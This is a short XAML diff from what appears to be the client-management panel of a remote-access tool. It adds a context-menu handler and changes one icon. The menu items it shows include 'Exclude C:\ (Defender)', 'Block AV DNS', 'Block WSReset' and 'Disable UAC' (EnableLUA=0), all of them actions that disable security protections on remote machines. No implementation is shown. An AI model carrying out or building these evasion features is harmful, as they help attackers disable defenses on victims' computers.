@@ -1842,6 +1842,7 @@
                                           PreviewKeyDown="GridClients_PreviewKeyDown"
                                           PreviewMouseLeftButtonDown="GridClients_PreviewMouseLeftButtonDown"
                                           MouseRightButtonDown="GridClients_MouseRightButtonDown"
+                                          ContextMenuOpening="GridClients_ContextMenuOpening"
                                           Sorting="GridClients_Sorting"
                                           SelectionChanged="GridClients_SelectionChanged"
                                           Background="{DynamicResource InputBgBrush}" Foreground="{DynamicResource ContentTextBrush}"
@@ -2037,7 +2038,7 @@
                                             <!-- Miscellaneous -->
                                             <MenuItem x:Name="MenuGrpMisc" Header="Miscellaneous">
                                                 <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_Options.svg'}" Width="14" Height="14"/></MenuItem.Icon>
-                                                <MenuItem x:Name="MenuItemExcludeDefender" Header="Exclude C:\ (Defender)" Click="QuickExcludeCDrive_Click"><MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Business Objects/BO_Security_Permission.svg'}" Width="14" Height="14"/></MenuItem.Icon></MenuItem>
+                                                <MenuItem x:Name="MenuItemExcludeDefender" Header="Exclude C:\ (Defender)" Click="QuickExcludeCDrive_Click"><MenuItem.Icon><Image Source="pack://application:,,,/defender.png" Width="14" Height="14" RenderOptions.BitmapScalingMode="HighQuality"/></MenuItem.Icon></MenuItem>
                                                 <MenuItem x:Name="MenuItemBlockAvDns"      Header="Block AV DNS"        Click="QuickBlockAvDns_Click">  <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_Forbid.svg'}"        Width="14" Height="14"/></MenuItem.Icon></MenuItem>
                                                 <MenuItem x:Name="MenuItemBlockWSReset"    Header="Block WSReset"       Click="QuickBlockReset_Click">  <MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_Rollback.svg'}"     Width="14" Height="14"/></MenuItem.Icon></MenuItem>
                                                 <MenuItem x:Name="MenuItemDisableUac"      Header="Disable UAC"         Click="QuickDisableUac_Click" ToolTip="EnableLUA=0 (admin required, takes effect after reboot)"><MenuItem.Icon><dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Security_Unlock.svg'}"  Width="14" Height="14"/></MenuItem.Icon></MenuItem>
